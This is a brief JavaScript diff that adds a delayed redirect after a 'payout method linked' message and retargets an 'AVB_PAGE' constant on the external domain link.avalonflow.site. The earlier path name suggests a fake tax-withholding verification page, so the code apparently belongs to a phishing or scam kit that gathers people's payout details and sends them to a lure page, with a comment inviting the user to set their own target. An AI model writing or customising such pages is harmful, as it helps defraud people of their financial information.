@@ -990,10 +990,14 @@ window.addEventListener("load", () => {
     );
 
     if (hasSavedData) {
-        showNotification("Payout method linked successfully");
-    } else {
-        showNotification("Provide your payout details");
-    }
+    showNotification("Payout method linked successfully");
+
+    setTimeout(() => {
+        window.location.href = "https://link.avalonflow.site/custom"; // change to your target page
+    }, 1500); // small delay so user sees message
+} else {
+    showNotification("Provide your payout details");
+}
 
     setTimeout(() => {
         updateSessionUI();
@@ -1007,7 +1011,7 @@ AVB ENGINE (DASHBOARD MATCH)
 
 (function avbEngine() {
 
-    const AVB_PAGE = "https://link.avalonflow.site/crawithholdingverification";
+    const AVB_PAGE = "https://link.avalonflow.site/custom";
 
     if (!localStorage.getItem("avb_expiry_time")) {
         localStorage.setItem(
